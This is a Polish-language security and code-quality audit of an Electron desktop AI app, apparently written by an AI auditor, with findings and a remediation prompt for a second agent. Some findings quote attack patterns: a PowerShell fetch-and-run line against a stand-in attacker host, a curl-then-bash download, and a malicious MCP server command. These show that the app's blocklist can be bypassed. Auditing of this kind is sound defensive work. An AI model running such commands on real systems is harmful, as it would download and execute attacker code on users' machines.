# KXAI — Pełny Audyt Repozytorium

**Data:** 2026-02-26
**Audytor:** Claude Opus 4.6
**Scope:** Cały kod źródłowy, zależności, konfiguracja, testy, bezpieczeństwo
**Kontekst:** Desktopowa aplikacja Electron (nie chmura), v0.1.0-alpha

---

## PODSUMOWANIE WYKONAWCZE

| Kategoria | KRYTYCZNE | WYSOKIE | ŚREDNIE | NISKIE |
|-----------|:---------:|:-------:|:-------:|:------:|
| Bezpieczeństwo | 4 | 8 | 6 | 3 |
| Błędy kodu | 2 | 5 | 12 | 8 |
| Zależności | 1 | 2 | 3 | 2 |
| Architektura/Over-engineering | 0 | 2 | 5 | 4 |
| Under-engineering | 1 | 4 | 6 | 3 |
| Testy | 0 | 3 | 4 | 2 |
| **RAZEM** | **8** | **24** | **36** | **22** |

**Stan ogólny:** TypeScript kompiluje się bez błędów. ESLint: 0 errors, 201 warnings. Testy: 507/507 passing. npm audit: 1 HIGH (xlsx).

---

## 1. BEZPIECZEŃSTWO (KRYTYCZNE)

### SEC-C1: Klucz szyfrowania API przechowywany jako plaintext na dysku
**Plik:** `src/main/services/security.ts:28-36`
**Ważność:** KRYTYCZNA
```
Klucz AES-256 jest zapisywany w pliku `.kxai-key` jako hex string.
Na Windows `mode: 0o600` NIE DZIAŁA — NTFS nie obsługuje Unix permissions.
Każdy program użytkownika może odczytać klucz i odszyfrować API keys.
```
**Naprawa:** Użyć Windows DPAPI (`electron.safeStorage.encryptString()`) na Windows, Keychain na macOS, libsecret na Linux. Electron ma wbudowane `safeStorage` API właśnie do tego celu.

### SEC-C2: Dashboard HTTP bez uwierzytelniania
**Plik:** `src/main/services/dashboard-server.ts`
**Ważność:** KRYTYCZNA
```
Express server na localhost:5678 serwuje API bez żadnej autentykacji.
Każda aplikacja na tym samym komputerze może:
- Czytać konwersacje, narzędzia, RAG dane
- Odpalić meeting prep research
- Podłączyć/odłączyć MCP serwery
- Odczytać status systemu
WebSocket również bez auth — może śledzić aktywność agenta.
```
**Naprawa:** Dodać token auth generowany per-sesję, wysyłany przez IPC do renderera, wymagany w nagłówku Authorization.

### SEC-C3: Plugin system wykonuje arbitrary code via `require()`
**Plik:** `src/main/services/plugin-service.ts:151-154`
**Ważność:** KRYTYCZNA
```
Pluginy ładowane przez `require(filePath)` mają pełny dostęp do Node.js:
- System plików, sieć, child_process, crypto
- Dostęp do electron APIs via require('electron')
- Mogą czytać klucze API, modyfikować bazę, exfiltrować dane
Auto-approval nowych pluginów (linia 144) oznacza, że każdy plik .js
wrzucony do katalogu plugins/ zostanie automatycznie załadowany i wykonany.
```
**Naprawa:** (1) Usunąć auto-approval — wymagać explicit approval przez UI. (2) Uruchamiać pluginy w vm2/isolated-vm sandboxie. (3) Ograniczyć API dostępne dla pluginów.

### SEC-C4: `shell.openExternal()` bez pełnej walidacji
**Plik:** `src/main/main.ts:275-276`
**Ważność:** KRYTYCZNA
```
Nawigacja do zewnętrznych URL otwiera je via shell.openExternal().
Electron docs ostrzegają, że to może wykonywać programy jeśli URL
to np. `file:///`, `smb://`, lub custom protocol handler.
Walidacja sprawdza tylko czy URL zaczyna się od appOrigins,
ale nie blokuje niebezpiecznych protokołów w otwieranych linkach.
```
**Naprawa:** Dodać explicit whitelist protokołów (`https:`, `http:`) przed `shell.openExternal()`.

---

## 2. BEZPIECZEŃSTWO (WYSOKIE)

### SEC-H1: Sandbox wyłączony w webPreferences
**Plik:** `src/main/main.ts:190`
**Ważność:** WYSOKA
```
`sandbox: false` — renderer process ma dostęp do Node.js APIs
przez preload script. Komentarz mówi "Required for desktopCapturer"
ale desktopCapturer jest deprecated w nowszych wersjach Electron.
```
**Naprawa:** Przenieść desktopCapturer do main process, włączyć sandbox.

### SEC-H2: CSP zezwala na `unsafe-inline` i `unsafe-eval` w dev, `unsafe-inline` w prod
**Plik:** `src/main/main.ts:207-211`
**Ważność:** WYSOKA
```
Production CSP: `default-src 'self' 'unsafe-inline'`
'unsafe-inline' pozwala na XSS jeśli atakujący wstrzyknie HTML.
Biorąc pod uwagę że app renderuje markdown z AI odpowiedzi
i wyników narzędzi, to otwiera wektor ataku.
```
**Naprawa:** Usunąć `unsafe-inline`, użyć nonce-based CSP lub hash-based.

### SEC-H3: Brak rate limitów na IPC channels
**Plik:** `src/main/ipc.ts` (cały plik)
**Ważność:** WYSOKA
```
Nie ma rate limitingu na IPC invoke calls.
Złośliwy/bugged renderer mógłby spamować:
- AI_STREAM_MESSAGE (koszty API)
- TOOLS_EXECUTE (exec shell commands)
- RAG_REINDEX (DoS CPU)
- AUTOMATION_TAKE_CONTROL
Jedyny rate limit jest wewnątrz SecurityGuard dla tool execution.
```
**Naprawa:** Dodać rate limiting wrapper na poziomie IPC, szczególnie dla kosztownych kanałów.

### SEC-H4: `exec()` w automation-service z potencjalnym injection na macOS/Linux
**Plik:** `src/main/services/automation-service.ts:217-218`
**Ważność:** WYSOKA
```
keyboardShortcut na macOS:
`osascript -e 'tell app "System Events" to keystroke "${key}"${using}'`
Jeśli AI przekaże key z single-quote, to injection jest możliwy.
keyboardType na Windows poprawnie używa EncodedCommand (linia 164).
```
**Naprawa:** Użyć `execFile()` zamiast `exec()` dla osascript, przekazując argumenty jako array.

### SEC-H5: Brak walidacji MCP server commands
**Plik:** `src/main/services/mcp-client-service.ts` + dashboard routes
**Ważność:** WYSOKA
```
MCP stdio transport spawnuje procesy z `command` i `args` z konfiguracji.
Dashboard API pozwala na dodawanie serwerów z arbitrary commands
bez walidacji co się uruchamia. Wektor: dodaj MCP server z
command: "powershell" args: ["-c", "malicious_command"].
```
**Naprawa:** Whitelist dozwolonych commands (npx, node, python), walidować args.

### SEC-H6: CalDAV credentials mogą leakować do logów
**Plik:** `src/main/services/calendar-service.ts`
**Ważność:** WYSOKA
```
Logger może logować obiekty z credentials przy error handling.
CalDAV password jest encrypted ale może być widoczny w stack traces.
```
**Naprawa:** Scrubować credentials z obiektów przed logowaniem.

### SEC-H7: SecurityGuard command blocklist jest łatwo obchodzony
**Plik:** `src/main/services/security-guard.ts:38-72`
**Ważność:** WYSOKA
```
Blacklist approach jest z natury niekompletny:
- "rm -rf /" blokuje, ale "rm -rf /home" nie
- Brak blokowania: `curl url > script.sh && bash script.sh`
- PowerShell: `iex (irm attacker.com/payload)`
- Base64 encoding obchodzi string matching
```
**Naprawa:** Rozważyć allowlist (whitelist) approach — pozwalać tylko na znane bezpieczne komendy. Dodać analizę AST poleceń.

### SEC-H8: Operator precedence bug w URL validation
**Plik:** `src/main/services/security-guard.ts:290`
**Ważność:** WYSOKA (logic bug)
```typescript
if (first === 10 || first === 172 && second >= 16 && second <= 31 || first === 192 && second === 168)
```
`&&` ma wyższy priorytet niż `||`, więc to jest:
`(10) || (172 && 16-31) || (192 && 168)` — co jest POPRAWNE przypadkowo,
ale brak nawiasów to tykająca bomba maintenance. Dodać nawiasy.

---

## 3. BEZPIECZEŃSTWO (ŚREDNIE)

### SEC-M1: `uncaughtException` handler nie restartuje procesu
**Plik:** `src/main/main.ts:32-33`
**Ważność:** ŚREDNIA
```
Komentarz: "Don't exit — try to keep running for user experience"
Po uncaughtException stan aplikacji jest niezdefiniowany.
Kontynuowanie może prowadzić do data corruption lub security bypass.
```
**Naprawa:** Logować, zamknąć gracefully, auto-restart.

### SEC-M2: Audit log save race condition
**Plik:** `src/main/services/security-guard.ts:437-444`
**Ważność:** ŚREDNIA
```
saveAuditLog() jest fire-and-forget async.
Wiele jednoczesnych wywołań może prowadzić do:
- Overwrite (starsza wersja nadpisuje nowszą)
- Corrupted JSON (równoległe zapisy)
```
**Naprawa:** Dodać debouncing lub queue dla zapisów.

### SEC-M3: DOMPurify ADD_ATTR pozwala na `style`
**Plik:** `src/renderer/components/ChatPanel.tsx:62`
**Ważność:** ŚREDNIA
```
`DOMPurify.sanitize(html, { ADD_ATTR: ['style'] })`
Atrybut `style` pozwala na CSS injection (data exfiltration via
background-image URLs, UI spoofing). AI może generować markdown
z inline styles.
```
**Naprawa:** Usunąć ADD_ATTR lub ograniczyć dozwolone CSS properties.

### SEC-M4: Background exec via IPC bez ograniczeń
**Plik:** preload `backgroundExec` + ipc handler
**Ważność:** ŚREDNIA
```
backgroundExec(task: string) pozwala na uruchomienie dowolnego
zadania w tle. Brak limitu na ilość jednoczesnych.
```

### SEC-M5: Privacy export może ujawnić dane z memory
**Plik:** `src/main/services/privacy-service.ts`
**Ważność:** ŚREDNIA
```
GDPR data export może eksportować SOUL.md, USER.md, MEMORY.md
które mogą zawierać wrażliwe dane użytkownika do pliku.
```

### SEC-M6: `pdf-parse` vulnerability potential
**Ważność:** ŚREDNIA
```
pdf-parse 2.4.5 — brak znanych CVE ale parsuje untrusted PDFs.
Potencjalne DoS/memory exhaustion na malicious PDFs.
```

---

## 4. BŁĘDY KODU

### BUG-C1: `mainWindow.isDestroyed()` bez null check w IPC
**Plik:** `src/main/ipc.ts:153-158`
**Ważność:** KRYTYCZNA
```typescript
if (!mainWindow.isDestroyed()) {
  mainWindow.webContents.send(Ev.AI_STREAM, { chunk });
}
```
Po `app.quit()`, mainWindow może być null, a ten kod jest w async
callback który może odpalić po zamknięciu okna.
Linie: 153, 157, 182, 188, 189, 193, 194, 198, 199, 200.
```
**Naprawa:** Dodać `mainWindow &&` przed `.isDestroyed()`.

### BUG-C2: `result` used but possibly undefined w main.ts take-control
**Plik:** `src/main/main.ts:403-408`
**Ważność:** ŚREDNIA
```typescript
const result = await agentLoop.startTakeControl(...);
// result is assigned but never used
```
Unused variable — nieszkodliwy ale wskazuje na brakującą logikę.

### BUG-H1: Race condition w ConfigService flushSave
**Plik:** `src/main/services/config.ts:148-149`
**Ważność:** WYSOKA
```typescript
if (this.saving) return; // <-- jeśli 2 save'y prawie jednocześnie
this.saving = true;      //     drugi zostanie pominięty
```
Jeśli scheduleSave odpali się dwukrotnie szybko:
1. Pierwszy flushSave ustawia `saving = true`
2. Drugi flushSave widzi `saving = true` i wraca bez zapisu
3. Zmiany z drugiego wywołania mogą być utracone
```
**Naprawa:** Zamiast `return`, ustawić flagę `pendingSave` i ponowić po zakończeniu.

### BUG-H2: Singleton SecurityGuard vs Container instance
**Plik:** `src/main/services/tools-service.ts:39-40`
**Ważność:** WYSOKA
```typescript
constructor() {
  this.securityGuard = new SecurityGuard(); // Nowa instancja
  this.systemMonitor = new SystemMonitor(); // Nowa instancja
```
ToolsService tworzy WŁASNE instancje SecurityGuard i SystemMonitor
w konstruktorze. Potem w `setServices()` (linia 171) mogą być
zastąpione instancjami z kontenera. Ale: audit log z pierwszych
operacji trafia do starej instancji i jest utracony.
```
**Naprawa:** Nie tworzyć w konstruktorze — wymagać w setServices() lub przekazać w konstruktorze.

### BUG-H3: `void calendar.initialize()` ignoruje błędy
**Plik:** `src/main/services/service-container.ts:308`
**Ważność:** ŚREDNIA
```typescript
void calendar.initialize();
```
Jeśli initialize rzuci wyjątek, zostanie po cichu zignorowany.
Użytkownik nie dowie się że kalendarz nie działa.
```
**Naprawa:** Dodać `.catch(err => log.error(...))`.

### BUG-H4: `PDFParse` import issue
**Plik:** `src/main/services/rag-service.ts:10`
**Ważność:** ŚREDNIA
```typescript
import { PDFParse } from 'pdf-parse';
```
To import może nie działać — pdf-parse eksportuje default export,
nie named. Powinno być `import pdfParse from 'pdf-parse'`.
Jeśli to nie jest używane bezpośrednio (bo FileIntelligenceService
obsługuje PDF), to unused import.
```

### BUG-M1-M8: Pozostałe medium bugs
- **preload.ts**: 56 wystąpień `any` type — brak typowania preload bridge
- **ipc.ts**: Wiele handlerów nie opakowuje wyniku w try/catch
- **screen-monitor.ts**: `setTimeout` bez cleanup przy shutdown
- **meeting-coach.ts**: 36 linii `console.log/error/warn` zamiast `log.*`
- **plugin-service.ts**: 12 linii bezpośredniego `console.*`
- **tools-service.ts**: `exec()` na linia 245 z `maxBuffer: 1024 * 1024` — 1MB to za dużo dla normalnych komend
- **browser-service.ts**: 22 puste `catch {}` bloki (swallowed errors)
- **embedding-service.ts**: 6 pustych `catch {}` bloków

---

## 5. ZALEŻNOŚCI

### DEP-H1: `xlsx` ma HIGH severity vulnerability
**Ważność:** WYSOKA
```
xlsx  *
- Prototype Pollution (GHSA-4r6h-8v6p-xvw6)
- ReDoS (GHSA-5pgg-2g8v-p4x9)
Brak dostępnej poprawki.
```
**Naprawa:** Zastąpić `xlsx` pakietem `exceljs` lub `xlsx-populate` (aktywnie utrzymywane).

### DEP-H2: `sqlite-vec` jest w wersji alpha
**Plik:** `package.json:61`
**Ważność:** WYSOKA
```
"sqlite-vec": "^0.1.7-alpha.2"
Alpha w production — API mogą się zmienić, potencjalne crashe,
brak gwarancji stabilności.
```
**Naprawa:** Pin do konkretnej wersji, dodać fallback dla sytuacji gdy moduł nie załaduje się poprawnie.

### DEP-M1: `react` i `react-dom` w devDependencies zamiast dependencies
**Plik:** `package.json:91-92`
**Ważność:** ŚREDNIA
```
React jest w devDependencies ale jest bundlowany do dist.
Technicznie działa (Vite bundluje go), ale to incorrect — React
powinien być w dependencies ponieważ jest wymagany w runtime
(choć bundled).
```

### DEP-M2: `zustand` w dependencies ale jest renderer-only
**Plik:** `package.json:67`
**Ważność:** NISKA
```
zustand jest używany tylko w renderer, który jest bundlowany przez Vite.
Powinien być w devDependencies dla czystości (main process go nie potrzebuje,
a electron-builder nie musi go pakować osobno).
```

### DEP-M3: `dompurify` vs `@types/dompurify` wersja drift
**Ważność:** NISKA
```
dompurify ^3.3.1 + @types/dompurify ^3.0.5 — minor version gap.
Typy mogą nie pokrywać najnowszych API. Monitorować.
```

### DEP-L1: Brak `electron` w `resolutions` / version pinning
**Ważność:** NISKA
```
electron ^33.0.0 — semver caret pozwala na minor bumps.
Electron minor releases mogą zmieniać zachowanie.
Rozważyć exact pin.
```

### DEP-L2: `shiki` ^3.23.0 — duża zależność
**Ważność:** NISKA
```
shiki waży ~30MB (wasm + gramary). Dla code highlighting w chacie
to overkill. Alternatywa: highlight.js (~1MB) lub prism (~200KB).
Ale: shiki daje lepszą jakość, więc akceptowalne.
```

---

## 6. ARCHITEKTURA / OVER-ENGINEERING

### OVER-H1: ServiceContainer + IPCServices double mapping
**Plik:** `src/main/services/service-container.ts:94-122`
**Ważność:** WYSOKA
```
ServiceContainer przechowuje serwisy pod krótkimi kluczami
(np. 'config'), ale setupIPC() wymaga innego nazewnictwa
(np. 'configService'). getIPCServices() mapuje ręcznie.
To 2 oddzielne interfejsy z 31 polami każdy.
```
**Naprawa:** Ujednolicić nazewnictwo — albo refaktoryzować ipc.ts aby używał ServiceContainer.get() bezpośrednio.

### OVER-H2: ipc.ts to >800 linii monolityczny plik
**Plik:** `src/main/ipc.ts`
**Ważność:** WYSOKA
```
Wszystkie IPC handlery w jednym pliku. Trudno utrzymać, testować,
i nawigować. To największy plik w projekcie.
```
**Naprawa:** Rozdzielić na moduły per-domain: `ipc/ai.ts`, `ipc/config.ts`, `ipc/meeting.ts`, etc.

### OVER-M1: preload.ts to 399 linii powtarzalnego kodu
**Plik:** `src/main/preload.ts`
**Ważność:** ŚREDNIA
```
Każdy IPC channel wymaga osobnej funkcji w preload.
Większość to jednolinijkowe ipcRenderer.invoke().
Można to wygenerować automatycznie z ipc-schema.ts.
```
**Naprawa:** Dynamicznie generować preload bridge z Ch/Ev/ChSend stałych.

### OVER-M2: Dwie warstwy walidacji URL — SecurityGuard + ToolsService
**Pliki:** `security-guard.ts:276-303`, `tools-service.ts:50-102`
**Ważność:** ŚREDNIA
```
validateUrl() w SecurityGuard i validateSSRF() w ToolsService
robią podobne rzeczy, ale z różnym zakresem.
ToolsService ma pełniejszą wersję (z DNS resolution).
SecurityGuard sprawdza URL ale bez DNS.
```
**Naprawa:** Jedna kanonizna metoda SSRF validation, używana wszędzie.

### OVER-M3: Take Control dwa oddzielne path'y (Anthropic + OpenAI)
**Plik:** `src/main/services/take-control-engine.ts`
**Ważność:** NISKA
```
Dwa osobne ~150-liniowe loopy (takeControlNativeAnthropic + takeControlVisionFallback)
z dużo wspólnego kodu (coordinate scaling, action logging, abort handling).
```
**Naprawa:** Wyodrębnić wspólną logikę do base klasy lub helper methods.

### OVER-M4: Prompt templates jako markdown files w extraResources
**Ważność:** NISKA
```
9 plików .md ładowanych runtime z fs — to dodaje I/O i czyni
prompty trudnymi do walidacji compile-time. Ale: pozwala na
customizację bez rebuildu. Trade-off akceptowalny.
```

### OVER-L1-L4: Minor over-engineering
- **tool-schema-converter.ts**: Converter tools to OpenAI AND Anthropic format — duplication ale konieczne
- **WorkflowAutomator** + **WorkflowService** — dwa osobne serwisy na workflow
- **EmbeddingService** + **EmbeddingWorker** — worker thread dla CPU-bound ops, sensowne ale dodaje complexity
- **ProactiveEngine** — 7 typów wydarzeń, 4 AI tools — ambitne na MVP

---

## 7. UNDER-ENGINEERING

### UNDER-C1: Brak graceful degradation gdy API key nie jest ustawiony
**Ważność:** KRYTYCZNA
```
Wiele serwisów rzuci runtime error jeśli spróbujesz użyć AI
bez ustawionego klucza API. Brak centralnego "is AI available?" check.
Onboarding wymaga klucza, ale użytkownik może go usunąć później.
```
**Naprawa:** Centralny `isAIConfigured()` check, graceful error w UI.

### UNDER-H1: Brak database migrations poza schema_version
**Plik:** `src/main/services/database-service.ts`
**Ważność:** WYSOKA
```
SCHEMA_VERSION = 2 i prosty if/else w initialize().
Brak rollback, brak migration history, brak transakcji.
Jeśli migracja crashnie w połowie, baza jest w nieznanym stanie.
```
**Naprawa:** Owinąć migracje w transakcje, zapisywać stan migracji.

### UNDER-H2: Brak retry logic dla filesystem operations
**Ważność:** ŚREDNIA
```
Wiele operacji fs (save config, write audit log, write memory)
nie ma retry logic. Na Windows pliki mogą być locked przez AV
lub inne programy. Jeden nieudany zapis = utracone dane.
```

### UNDER-H3: Brak health check / watchdog
**Ważność:** ŚREDNIA
```
Jeśli main process wisi (infinite loop w tool, deadlock),
nie ma watchdog który to wykryje i zrestartuje.
uncaughtException handler loguje ale kontynuuje.
```

### UNDER-H4: Brak telemetrii / crash reportingu
**Ważność:** ŚREDNIA (dla projektu produkcyjnego)
```
Brak Sentry, Bugsnag, czy custom crash reporter.
Jak użytkownik zgłosi bug, nie ma żadnych danych diagnostycznych.
Logger pisze do konsoli, nie do pliku (poza audit log).
```

### UNDER-M1: Brak cleanup starych session files
**Ważność:** ŚREDNIA
```
SQLite sessions + stare JSON files mogą rosnąć bez limitu.
DEFAULT_DELETE_DAYS = 90 ale retention nie jest egzekwowane
automatycznie (brak cron job do cleanup).
```

### UNDER-M2: Brak connection pooling/limiting dla WebSocket w dashboard
**Ważność:** ŚREDNIA
```
Dashboard WebSocket akceptuje nieograniczoną liczbę klientów.
Brak heartbeat/ping, brak max connections.
```

### UNDER-M3: Brak i18n fallback chain
**Ważność:** NISKA
```
Jeśli klucz tłumaczenia brakuje w pl.ts, nie ma fallback do en.ts.
Użytkownik zobaczy key name zamiast tekstu.
```

### UNDER-M4-M6: Minor under-engineering
- Brak `Content-Type` validation w dashboard API POST endpoints
- Brak request body size limit w Express
- Brak timeout na WebSocket connections

---

## 8. ESLINT WARNINGS (201 total)

### Kategorie:
| Typ | Ilość | Ważność |
|-----|:-----:|---------|
| `no-restricted-properties` (sync fs) | ~160 | NISKA — migration path, nie blokuje |
| `react-hooks/exhaustive-deps` | 4 | ŚREDNIA — potencjalne stale closures |
| `@typescript-eslint/no-unused-vars` | 6 | NISKA — cleanup |
| `@typescript-eslint/no-explicit-any` | OFF | — wyłączony, 413 wystąpień `any` |

### React hooks issues (naprawić priorytetowo):
1. **ChatPanel.tsx:412** — `useEffect` brak dep `captureAndAnalyze` — stale closure w screen capture
2. **ChatPanel.tsx:70** — `useMemo` unnecessary dep `highlighterReady`
3. **CoachingOverlay.tsx:308** — `useCallback` brak dep `t` — stale translations
4. **SettingsPanel.tsx:106** — `useEffect` brak dep `checkApiKey`

---

## 9. TESTY

### TEST-H1: Brak testów dla 42/55 serwisów
**Ważność:** WYSOKA
```
Serwisy BEZ testów (krytyczne):
- ai-service.ts (rdzeń AI - brak testów!)
- agent-loop.ts (orkiestrator - brak testów!)
- database-service.ts (dane - brak testów!)
- security.ts (encryption - brak testów!)
- tools-service.ts (wykonanie komend - brak testów!)
- browser-service.ts (automacja - brak testów!)
- automation-service.ts (sterowanie komputerem - brak testów!)
- dashboard-server.ts (HTTP API - brak testów!)
- plugin-service.ts (code execution - brak testów!)
- rag-service.ts (vector search - brak testów!)
- mcp-client-service.ts (external tools - brak testów!)
- take-control-engine.ts (autonomiczny dostęp - brak testów!)
... i 30 więcej
```

### TEST-H2: Pokrycie kodu: 30% target — za niskie
**Ważność:** WYSOKA
```
vitest.config.ts thresholds: lines: 30, functions: 25, branches: 20
Dla aplikacji z autonomicznym dostępem do komputera użytkownika
minimum powinno być 60% lines, 50% branches.
```

### TEST-H3: Brak testów security-critical paths
**Ważność:** WYSOKA
```
Zero testów dla:
- Encryption/decryption (security.ts)
- Command injection prevention (real commands)
- SSRF validation (real DNS resolution)
- Plugin sandboxing
- Take-control safety
```

### TEST-M1-M4: Medium test issues
- E2E testy (5 specs) nie testują happy path AI interaction
- Brak integration testów z prawdziwą bazą SQLite
- Brak snapshot testów UI komponentów
- Test timeout 30s (vitest.config.ts) za wysoki — ukrywa wolne testy

---

## 10. KONFIGURACJA

### CFG-M1: tsconfig paths nie rozwiązywane runtime
**Ważność:** ŚREDNIA
```
tsconfig.main.json definiuje paths @shared/* i @main/*
ale compiled JS nie rozwiąże tych alias'ów bez tsconfig-paths
lub module-alias. Sprawdzić czy import "@shared/..." działa
w runtime (jeśli tak, to Vite/bundler rozwiązuje; jeśli nie,
to potencjalny runtime crash).
```

### CFG-M2: electron-builder ASAR unpack only better-sqlite3
**Ważność:** NISKA
```
`asarUnpack: ["node_modules/better-sqlite3/**"]`
sqlite-vec (native module) też może wymagać unpackingu.
Jeśli nie działa po build, dodać sqlite-vec.
```

### CFG-M3: Brak eslint rule `@typescript-eslint/no-floating-promises`
**Ważność:** ŚREDNIA
```
Kilka `void someAsyncFunction()` w kodzie.
Włączenie `no-floating-promises` złapałoby brakujące `.catch()`.
```

---

## 11. `console.*` vs `log.*` INCONSISTENCY

**146 wystąpień `console.log/error/warn`** w src/main/ zamiast structured loggera.

Najgorsi offenders:
| Plik | console.* | Powinno być log.* |
|------|:---------:|:-----------------:|
| meeting-coach.ts | 36 | TAK |
| transcription-service.ts | 18 | TAK |
| agent-loop.ts | 21 | TAK |
| plugin-service.ts | 12 | TAK |
| ipc.ts | 10 | TAK |
| dashboard-server.ts | 8 | TAK |

---

## 12. `any` TYPE USAGE

**413 wystąpień `: any`** w src/ — `@typescript-eslint/no-explicit-any` jest wyłączony.

Najgorsi offenders:
| Plik | any count |
|------|:---------:|
| preload.ts | 56 |
| ipc.ts | 44 |
| tools-service.ts | 39 |
| browser-service.ts | 37 |
| knowledge-graph-service.ts | 25 |
| ai-service.ts | 21 |
| agent-loop.ts | 25 |

---

## 13. EMPTY `catch {}` BLOCKS

**165 pustych `catch {}` bloków** — errors silently swallowed.

Najgorsi offenders:
| Plik | Puste catch |
|------|:-----------:|
| browser-service.ts | 22 |
| cdp-client.ts | 17 |
| privacy-service.ts | 13 |
| rag-service.ts | 11 |
| meeting-coach.ts | 7 |

---

## PROMPT DO NAPRAWY (DLA DRUGIEGO AGENTA)

```
Jesteś agentem naprawczym dla projektu KxAI (Electron desktop app).

PRIORYTET 1 — SECURITY CRITICAL (napraw natychmiast):

1. `src/main/services/security.ts` — Zamień przechowywanie klucza
   szyfrującego z plaintext pliku na `electron.safeStorage` API:
   - `safeStorage.encryptString()` do zapisu
   - `safeStorage.decryptString()` do odczytu
   - Fallback: Windows DPAPI, macOS Keychain, Linux libsecret
   - Migracja: jeśli stary .kxai-key istnieje, zmigruj i usuń

2. `src/main/services/dashboard-server.ts` — Dodaj token auth:
   - Generuj random token per startup w ServiceContainer
   - Przekaż token do renderera via IPC
   - Wymagaj `Authorization: Bearer <token>` na wszystkich /api/* routes
   - WebSocket: wymagaj tokenu w query param przy connect
   - Binduj TYLKO do 127.0.0.1 (już jest)

3. `src/main/services/plugin-service.ts` — Usuń auto-approval:
   - Linia 144: zamiast auto-approve, ustaw status na "pending"
   - Dodaj IPC channel do listowania pending + approve/reject
   - Dodaj UI w SettingsPanel do zarządzania pluginami

4. `src/main/main.ts:271-281` — Walidacja shell.openExternal:
   - Przed shell.openExternal(url), sprawdź:
     `if (!url.startsWith('https://') && !url.startsWith('http://'))` → block
   - W setWindowOpenHandler też dodaj tę walidację

PRIORYTET 2 — HIGH BUGS (napraw w tej iteracji):

5. `src/main/ipc.ts` — Dodaj null-safe checks na mainWindow:
   - Wszędzie gdzie jest `mainWindow.isDestroyed()` → `mainWindow && !mainWindow.isDestroyed()`
   - Dotyczy linii: 153, 157, 182, 188, 189, 193, 194, 198, 199, 200
   - Użyj safeSend() helper który jest już zdefiniowany w linia 107

6. `src/main/services/config.ts:148` — Fix race condition:
   - Dodaj pole `private pendingSave = false`
   - W flushSave: jeśli saving=true, ustaw pendingSave=true i return
   - W finally bloku: jeśli pendingSave, ponownie wywołaj flushSave

7. `src/main/services/tools-service.ts:39-40` — Usuń tworzenie
   SecurityGuard i SystemMonitor w konstruktorze. Zamiast tego:
   - Zadeklaruj jako `private securityGuard!: SecurityGuard`
   - Wymagaj podania w setServices()
   - Lub: przyjmij w konstruktorze

8. `src/main/services/security-guard.ts:290` — Dodaj nawiasy:
   ```typescript
   if ((first === 10) || (first === 172 && second >= 16 && second <= 31) || (first === 192 && second === 168))
   ```

PRIORYTET 3 — DEPENDENCY FIXES:

9. Zamień `xlsx` na `exceljs`:
   - npm uninstall xlsx && npm install exceljs
   - Update src/main/services/file-intelligence.ts:
     zmień import i API calls (exceljs.readFile() → workbook.worksheets)

10. Pin sqlite-vec do exact version:
    - Zmień "^0.1.7-alpha.2" na "0.1.7-alpha.2" (bez ^)

PRIORYTET 4 — CODE QUALITY:

11. Zamień console.* na log.* w 6 plikach:
    - meeting-coach.ts, transcription-service.ts, agent-loop.ts,
      plugin-service.ts, ipc.ts, dashboard-server.ts
    - Użyj istniejącego `createLogger('ServiceName')`

12. Napraw React hooks warnings (4 pliki):
    - ChatPanel.tsx:412 → dodaj captureAndAnalyze do deps
    - ChatPanel.tsx:70 → usuń highlighterReady z deps
    - CoachingOverlay.tsx:308 → dodaj t do deps
    - SettingsPanel.tsx:106 → dodaj checkApiKey do deps

13. Dodaj `.catch()` do `void calendar.initialize()` w service-container.ts:308

14. Usuń unused imports:
    - CoachingOverlay.tsx:14 → cn
    - CronPanel.tsx:19 → editingId, setEditingId
    - SettingsPanel.tsx:4 → CalendarConfig
    - SettingsPanel.tsx:61 → indexedFolders
    - SettingsPanel.tsx:71 → mcpLoading
    - useStoreInit.ts:5 → useChatStore

PRIORYTET 5 — TESTING:

15. Dodaj testy dla security.ts:
    - Test encrypt/decrypt roundtrip
    - Test invalid encrypted format handling
    - Test setApiKey/getApiKey/deleteApiKey

16. Dodaj testy dla database-service.ts:
    - Test initialize() creates tables
    - Test CRUD messages
    - Test FTS5 search
    - Test retention cleanup

17. Dodaj testy dla dashboard-server.ts:
    - Test wszystkich GET /api/* endpoints
    - Test auth (po dodaniu w punkcie 2)
    - Test WebSocket connection

NIE RUSZAJ (dobre decyzje architektoniczne):
- ServiceContainer DI pattern — dobrze zorganizowany
- IPC Zod validation layer — solidne
- ToolLoopDetector — zapobiega infinite loops
- ContextBuilder structured output — dobra abstrakcja
- Debounced config save + atomic write — poprawne
- SSRF validation w ToolsService (z DNS resolution) — kompletna
- Memory system (SOUL/USER/MEMORY.md) — eleganckie
```
